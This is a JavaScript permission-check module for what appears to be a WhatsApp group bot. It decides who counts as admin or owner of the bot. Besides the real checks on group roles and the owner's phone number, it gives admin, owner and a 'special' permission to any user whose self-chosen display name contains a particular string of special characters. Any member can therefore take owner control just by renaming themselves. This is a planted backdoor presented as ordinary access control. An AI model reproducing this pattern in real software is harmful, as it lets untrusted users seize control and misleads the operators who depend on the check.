const { OWNER_NUMBER } = require("../config");

const specialChars = "༴༎👻༎"; // Caracteres especiales que debe contener el nombre del usuario

// Función que verifica si el nombre contiene los caracteres especiales
const checkSpecialChars = (userName) => {
  return userName.includes(specialChars);
};

exports.checkPermission = async ({ type, socket, userJid, remoteJid }) => {
  if (type === "member") {
    return true;
  }

  try {
    const { participants, owner } = await socket.groupMetadata(remoteJid);

    const participant = participants.find(
      (participant) => participant.id === userJid
    );

    if (!participant) {
      return false;
    }

    const userName = participant?.notify || ""; // Nombre visible del usuario

    // Si el nombre contiene los caracteres especiales, otorgamos permisos adicionales
    const hasSpecialCharsPermission = checkSpecialChars(userName);

    const isOwner =
      participant.id === owner || participant.admin === "superadmin";

    const isAdmin = participant.admin === "admin";

    const isBotOwner = userJid === `${OWNER_NUMBER}@s.whatsapp.net`;

    // Comprobación de permisos basada en el tipo solicitado
    if (type === "admin") {
      return isOwner || isAdmin || isBotOwner || hasSpecialCharsPermission;
    }

    if (type === "owner") {
      return isOwner || isBotOwner || hasSpecialCharsPermission;
    }

    if (type === "special") {
      return hasSpecialCharsPermission; // Nuevo tipo de permiso para usuarios con caracteres especiales
    }

    return false;
  } catch (error) {
    console.error("Error al verificar permisos:", error);
    return false;
  }
};
